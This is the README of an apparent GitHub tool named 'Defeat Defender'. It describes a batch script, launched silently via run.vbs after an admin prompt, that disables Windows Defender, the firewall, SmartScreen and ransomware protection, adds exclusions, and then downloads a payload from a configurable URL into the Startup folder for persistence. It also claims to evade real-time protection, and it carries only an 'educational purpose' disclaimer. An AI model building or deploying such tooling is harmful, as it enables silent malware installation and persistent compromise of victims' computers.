## Defeat Defender
Powerfull batch-file to disable windows defender, firewall, smartscreen and execute the payload. 

### Usage :
1. Edit defeat-defender.bat on line number 65 and replace the direct url of your payload.
2. Run the file named "run.vbs" , it will ask for admin permission. If permission granted the script will work silently without console windows.
3. After it got admin permission, it will disable windows defender as below action:
    - PUAProtection 
    - Automatic Sample Submission
    - Windows FireWall
    - Windows Smart Screen(Permanently)
    - Disable Quickscan
    - Add exe file  to exclusions in defender settings
    - Disable Ransomware Protection

### Bypasssing Windows Defender Techniques
Recently windows introduced a new feature called "Tamper Protection". Which prevents the disable of real-time protection and modifying defender registery keys using powershell or cmd. If you need to disable real-time protection you need to do manually. But i have done some trick to run our payload without triggering defender even "real-time protection" turned on.

### Behind The Scenes
When batch file is executed, it ask for admin permission. After getting admin privileage it starts to disable windows defender real time protectin, firewall, smartscreen and starts downloading our payload from server and it will placed in startup folder. The payload will be executed after it has downloaded from server and will be started whenever system starts.

### Note
If you want to enable Defender Smartscreen, you can use enable-smartscreen.bat script to reset the service.

### Discalimer
Use this only for educational purpose only.

### Credit

Code by https://github.com/swagkarna
